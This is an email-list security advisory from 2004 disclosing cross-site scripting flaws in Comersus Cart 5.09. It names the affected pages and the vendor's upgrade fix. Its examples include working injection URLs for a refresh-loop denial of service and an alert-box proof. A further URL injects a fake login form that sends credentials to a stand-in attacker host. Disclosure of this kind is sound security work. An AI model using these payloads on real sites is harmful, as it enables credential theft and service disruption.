
Date: Wed, 7 Jul 2004 11:10:13 -0400
From: "Thomas Ryan" <tommy@...videsecurity.com>
To: <bugtraq@...urityfocus.com>
Cc: <full-disclosure-admin@...ts.netsys.com>
Subject: Comersus Cart Cross-Site Scripting Vulnerability


Comersus Cart Cross-Site Scripting Vulnerability

Release Date:
July 6, 2004

Severity:
High

Vendor:
Comersus Open Technologies

Software:
Tested on Comersus Cart 5.09
Previous versions may also be affected.

Remote:
Remotely executed from any web browser

Technical Details:
The malicious user is able to compromise the parameters to invoke a
Cross-Site Scripting attack. This can be used to take advantage of the trust
between a client and server allowing the malicious user to execute malicious
JavaScript on the client's machine or perform a denial of service shutting
down IIS.

Pages Affected:
/comersus/store/comersus_customerAuthenticateForm.asp
/comersus/backofficeLite/comersus_backoffice_message.asp
/comersus/store/comersus_supportError.asp
/comersus/store/comersus_message.asp

Examples:

Denial of Service:
http://[VICTIM]/comersus/store/comersus_message.asp?message=<meta%20http-equ
iv='refresh'content='0'> 

Phishing:
http://[VICTIM]/comersus/store/comersus_message.asp?message=<form%20action="
http://www.evilhacker.com/save2db.asp"%20method="post">Username:<input%20nam
e="username"%20type="text"%20maxlength="30"><br>Password:<input%20name="pass
word"%20type="text"%20maxlength="30"><br><input%20name="login"%20type="submi
t"%20value="Login"></form>

XSS:
http://[VICTIM]/comersus/backofficeLite/comersus_backoffice_message.asp?mess
age=<script>alert("VULNERABLE_TO_XSS")</script>


Vendor Status:
Upgrade to 5.098
http://www.comersus.com/

Credit:
Discovered By: Thomas Ryan
Provide Security

Original Advisory
http://www.providesecurity.com/research/advisories/07062004-01.asp

Copyright (c) 2004 Provide Security
Permission is hereby granted for the redistribution of this alert
electronically. It is not to be edited in any way without the expressed
written consent of Provide Security. If you wish to reprint the whole or any
part of this advisory in any other medium excluding electronic medium,
please email secalert(a)providesecurity.com for permission.

Disclaimer
The information within this paper may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There are
no warranties, implied or express, with regard to this information. In no
event shall the author be liable for any direct or indirect damages
whatsoever arising out of or in connection with the use or spread of this
information. Any use of this information is at the user's own risk.



